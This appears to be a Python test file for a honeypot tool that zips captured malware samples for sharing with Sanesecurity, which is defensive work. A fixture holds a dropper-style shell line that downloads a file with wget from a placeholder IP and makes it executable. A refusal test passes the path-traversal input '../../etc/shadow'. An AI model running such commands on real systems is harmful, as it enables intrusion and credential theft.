# 0.49 Share captured malware with Sanesecurity (hp-sample-zip on the honeypot, a card on Files) and a Cisco Talos link.
import hashlib, importlib.machinery, importlib.util, io, os, tempfile, time, unittest, urllib.parse, zipfile
from contextlib import redirect_stderr, redirect_stdout
from unittest import mock

from tests.helpers import ROOT, app
from tests.test_v046 import SettingsKey


def load(name, path):
    loader = importlib.machinery.SourceFileLoader(name, path)
    spec = importlib.util.spec_from_loader(name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


hz = load("hp_sample_zip", os.path.join(ROOT, "honeypot", "hp-sample-zip"))

SCRIPT = b"#!/bin/sh\ncd /tmp; wget http://198.51.100.7/x; chmod +x x\n"
NOVEL, KNOWN, UNCHECKED = "1" * 64, "2" * 64, "3" * 64


class SampleZip(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="hpzip-")
        self.dl, self.out = os.path.join(self.tmp, "dl"), os.path.join(self.tmp, "out")
        os.makedirs(self.dl)
        self.env = mock.patch.dict(os.environ, {"HP_DOWNLOAD_DIRS": self.dl})
        self.env.start()
        mock.patch.object(hz, "OUT_DIR", self.out).start()
        self.addCleanup(mock.patch.stopall)
        self.addCleanup(self.env.stop)

    def put(self, name, data):
        with open(os.path.join(self.dl, name), "wb") as fh:
            fh.write(data)
        return hashlib.sha256(data).hexdigest()

    def run_tool(self, *args):
        o, e = io.StringIO(), io.StringIO()
        with redirect_stdout(o), redirect_stderr(e):
            rc = hz.main(["hp-sample-zip"] + list(args))
        return rc, o.getvalue(), e.getvalue()

    def zipfile(self):
        names = os.listdir(self.out)
        self.assertEqual(len(names), 1)
        return os.path.join(self.out, names[0])

    def test_roundtrip(self):
        a = self.put(hashlib.sha256(SCRIPT).hexdigest(), SCRIPT)
        blob = os.urandom(200000)
        b = self.put("redir_abcd1234", blob)                   # echo-built: the name is not the hash
        rc, out, _ = self.run_tool(a, b.upper(), a)             # upper case and a repeat are fine
        self.assertEqual(rc, 0)
        self.assertIn("password: infected", out)
        path = self.zipfile()
        self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)
        self.assertEqual(os.stat(self.out).st_mode & 0o777, 0o700)
        z = zipfile.ZipFile(path)
        self.assertEqual([i.filename for i in z.infolist()], [a + ".bin", b + ".bin", "manifest.txt"])
        for i in z.infolist():
            self.assertTrue(i.flag_bits & 1)                     # encrypted
            self.assertEqual(i.external_attr >> 16, 0o100600)     # no execute bit
        self.assertEqual(z.read(a + ".bin", pwd=b"infected"), SCRIPT)
        self.assertEqual(z.read(b + ".bin", pwd=b"infected"), blob)
        self.assertIn(b"redir_abcd1234", z.read("manifest.txt", pwd=b"infected"))
        with self.assertRaises(RuntimeError):
            z.read(a + ".bin", pwd=b"wrong")

    def test_refuses(self):
        self.assertEqual(self.run_tool()[0], 2)
        self.assertEqual(self.run_tool("../../etc/shadow")[0], 2)
        self.assertEqual(self.run_tool(*["%064x" % i for i in range(hz.MAX_FILES + 1)])[0], 2)
        # a symlink with a hash for a name, and a file whose content does not match its name
        os.symlink("/etc/hostname", os.path.join(self.dl, "a" * 64))
        self.put("b" * 64, b"not what the name says")
        rc, _out, err = self.run_tool("a" * 64, "b" * 64)
        self.assertEqual(rc, 1)
        self.assertIn("none of the files", err)
        self.assertFalse(os.path.exists(self.out))

    def test_missing_listed(self):
        a = self.put(hashlib.sha256(SCRIPT).hexdigest(), SCRIPT)
        rc, out, _ = self.run_tool(a, "c" * 64)
        self.assertEqual(rc, 0)
        self.assertIn("not found: " + "c" * 64, out)

    def test_dirs_from_conf(self):
        os.environ.pop("HP_DOWNLOAD_DIRS")
        conf = os.path.join(self.tmp, "hp-export")
        with open(conf, "w") as fh:
            fh.write('# x\nCOWRIE_DIRS="/home/cowrie/cowrie /home/cowrie/cowrie-cam"  # two personas\n')
        with mock.patch.object(hz, "CONF", conf):
            self.assertEqual(hz.download_dirs(), ["/home/cowrie/cowrie/var/lib/cowrie/downloads", "/home/cowrie/cowrie-cam/var/lib/cowrie/downloads"])


def unseed(con):
    with con:
        for t in ("files", "vt", "shared"):
            con.execute("DELETE FROM %s WHERE sha IN (?,?,?)" % t, (NOVEL, KNOWN, UNCHECKED))


def seed(con):
    now = time.time()
    unseed(con)
    with con:
        for i, sha in enumerate((NOVEL, KNOWN, UNCHECKED)):
            con.execute("INSERT INTO files(sha, src, size, type, arch, packed, iocs, mtime, updated) VALUES(?,?,?,?,?,?,?,?,?)",
                        (sha, "download", 100 + i, "ELF 32-bit", "arm", 0, "[]", now - i, now))
        con.execute("INSERT INTO vt(sha, checked, data) VALUES(?,?,?)", (NOVEL, now, '{"found": false, "at": %d}' % now))
        con.execute("INSERT INTO vt(sha, checked, data) VALUES(?,?,?)", (KNOWN, now, '{"found": true, "mal": 30, "total": 60, "at": %d}' % now))


class Candidates(unittest.TestCase):
    def tearDown(self):
        unseed(app.connect())

    def test_with_and_without_key(self):
        con = app.connect()
        seed(con)
        fi = {r["sha"]: r for r in con.execute("SELECT * FROM files")}
        vts = {s: app.json.loads(d) for s, d in con.execute("SELECT sha, data FROM vt")}
        shas = [NOVEL, KNOWN, UNCHECKED, "9" * 64]               # the last one only exists as an event: not on the honeypot list
        with mock.patch.object(app, "vt_key", return_value="k" * 64):
            self.assertEqual(app.share_candidates(con, shas, fi, vts), [NOVEL])
        with mock.patch.object(app, "vt_key", return_value=""):
            self.assertEqual(app.share_candidates(con, shas, fi, vts), [NOVEL, KNOWN, UNCHECKED])
            self.assertEqual(app.mark_shared(con, NOVEL + " junk <script> " + KNOWN), 2)
            self.assertEqual(app.share_candidates(con, shas, fi, vts), [UNCHECKED])
            self.assertEqual(app.mark_shared(con, KNOWN, on=False), 1)
            self.assertEqual(app.share_candidates(con, shas, fi, vts), [KNOWN, UNCHECKED])
        self.assertEqual(app.mark_shared(con, "nothing valid"), 0)


class Pages(SettingsKey):
    def tearDown(self):
        unseed(app.connect())

    def test_files_card_and_routes(self):
        con = app.connect()
        seed(con)
        with mock.patch.object(app, "vt_key", return_value="k" * 64):
            _r, html = self.req("GET", "/files", headers={"Cookie": self.cookie})
            self.assertIn("Share with Sanesecurity", html)
            self.assertIn("hp-sample-zip " + NOVEL, html)
            self.assertNotIn("hp-sample-zip " + KNOWN, html)
            _r, html = self.req("GET", "/files?fam=unknown", headers={"Cookie": self.cookie})
            self.assertIn("(unknown family only)", html)
            # not logged in: refused, nothing stored
            r, _ = self.req("POST", "/files/shared", urllib.parse.urlencode({"shas": NOVEL}), self.hdr())
            self.assertNotEqual(r.status, 303)
            self.assertIsNone(con.execute("SELECT 1 FROM shared WHERE sha=?", (NOVEL,)).fetchone())
            r, _ = self.req("POST", "/files/shared", urllib.parse.urlencode({"shas": "<b>x</b>"}), self.hdr({"Cookie": self.cookie}))
            self.assertEqual(r.status, 400)
            r, _ = self.req("POST", "/files/shared", urllib.parse.urlencode({"shas": NOVEL}), self.hdr({"Cookie": self.cookie}))
            self.assertEqual(r.getheader("Location"), "/files")
            _r, html = self.req("GET", "/files", headers={"Cookie": self.cookie})
            self.assertIn("Nothing new to share", html)
            self.assertIn(">shared</span>", html)
            self.assertIn("Undo the last one", html)
            r, _ = self.req("POST", "/files/unshared", urllib.parse.urlencode({"shas": NOVEL}), self.hdr({"Cookie": self.cookie}))
            self.assertEqual(r.getheader("Location"), "/files")
            self.assertIsNone(con.execute("SELECT 1 FROM shared WHERE sha=?", (NOVEL,)).fetchone())

    def test_talos_link(self):
        ip = "198.51.100.49"
        con = app.connect()
        with con:
            con.execute("DELETE FROM ips WHERE ip=?", (ip,))
            con.execute("INSERT INTO ips(ip, first, last) VALUES(?,?,?)", (ip, time.time() - 60, time.time()))
        _r, html = self.req("GET", "/ip/" + ip, headers={"Cookie": self.cookie})
        self.assertIn("https://talosintelligence.com/reputation_center/lookup?search=" + ip, html)
        with con:
            con.execute("DELETE FROM ips WHERE ip=?", (ip,))


if __name__ == "__main__":
    unittest.main()
